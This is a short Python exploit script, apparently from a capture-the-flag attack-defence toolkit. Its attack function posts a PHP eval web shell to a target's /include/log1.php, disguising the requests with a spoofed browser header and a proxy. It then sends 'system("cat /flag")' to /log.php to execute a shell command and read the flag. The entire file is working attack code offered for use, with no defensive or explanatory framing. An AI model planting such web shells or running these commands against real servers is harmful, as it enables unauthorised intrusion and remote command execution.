import requests
from libs.Misc import Config


def attack(ip, port):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    proxy = Config.proxy

    code = "<?php eval($_POST['cmd']);?>"
    url = 'http://{}:{}//include/log1.php'.format(ip, port)
    requests.post(url, data={'a': code}, proxies=proxy, headers=header)

    url = 'http://{}:{}/{}'.format(ip, port, '/log.php')
    response = requests.post(url, data={'cmd': 'system("cat /flag");'}, proxies=proxy, headers=header)
    return response.content.decode()
